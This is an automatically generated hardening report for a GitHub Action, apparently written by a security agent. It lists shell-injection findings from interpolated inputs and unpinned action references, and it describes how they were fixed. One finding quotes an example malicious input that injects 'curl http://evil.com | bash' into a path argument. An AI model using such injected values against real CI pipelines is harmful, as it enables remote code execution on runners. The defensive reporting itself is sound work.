<!-- markdownlint-disable -->

# Hardening Report: Trusera--ai-bom/v3.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **Trusera--ai-bom/v3.0.0** was hardened automatically. 11 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Run ai-bom scan' step in action.yml directly interpolates multiple `${{ inputs.* }}` expressions inside a `run:` shell block (sub-rule a). Specifically, `${{ inputs.path }}`, `${{ inputs.format }}`, `${{ inputs.output }}`, `${{ inputs.severity }}`, `${{ inputs.fail-on }}`, and `${{ inputs.policy-file }}` are all embedded directly into shell command strings before the shell ever sees them. A caller supplying a malicious value (e.g. `inputs.path` = `.; curl http://evil.com | bash`) can execute arbitrary commands on the runner. All these inputs must be moved to `env:` variables and referenced as quoted shell variables (e.g. `"$INPUT_PATH"`) instead.

Locations:

- `action.yml:59`
- `action.yml:60`
- `action.yml:61`
- `action.yml:63`
- `action.yml:64`
- `action.yml:66`
- `action.yml:67`

### unpinned-uses (severity: high)

Two `uses:` references in action.yml are pinned to mutable version tags rather than immutable 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the upstream tag is moved or compromised: (1) `actions/setup-python@v5` (line 49); (2) `github/codeql-action/upload-sarif@v3` (line 72). Both should be pinned to their full SHA digests, e.g. `actions/setup-python@<40-char-sha> # v5`.

Locations:

- `action.yml:49`
- `action.yml:72`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.path }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:65`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.format }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:65`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.output }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:65`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.severity }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:66`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.severity }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:67`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fail-on }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:69`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fail-on }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:70`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.policy-file }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:72`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.policy-file }}" appears directly in run: block of step "Run ai-bom scan"; move to env: map

Locations:

- `action.yml:73`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

1. Pinned `actions/setup-python@v5` to SHA `a26af69be951a213d495a4c3e4e4022e16d87065` with `# v5` comment. 2. Pinned `github/codeql-action/upload-sarif@v3` to SHA `dd903d2e4f5405488e5ef1422510ee31c8b32357` with `# v3` comment. 3. Moved all six `${{ inputs.* }}` expressions (path, format, output, severity, fail-on, policy-file) from the `run:` shell block into an `env:` map as INPUT_PATH, INPUT_FORMAT, INPUT_OUTPUT, INPUT_SEVERITY, INPUT_FAIL_ON, INPUT_POLICY_FILE. The shell script now references these as quoted `"$VAR"` variables. Also replaced the string-concatenation ARGS variable with a bash array to keep flag/value pairs as separate shell words, preventing argument boundary issues.

